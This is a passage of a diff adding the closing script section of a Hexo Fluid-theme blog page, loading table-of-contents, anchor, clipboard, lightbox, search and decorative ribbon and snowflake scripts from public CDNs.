+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/DynamicRibbon.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/DynamicLine.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/snowflake.min.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
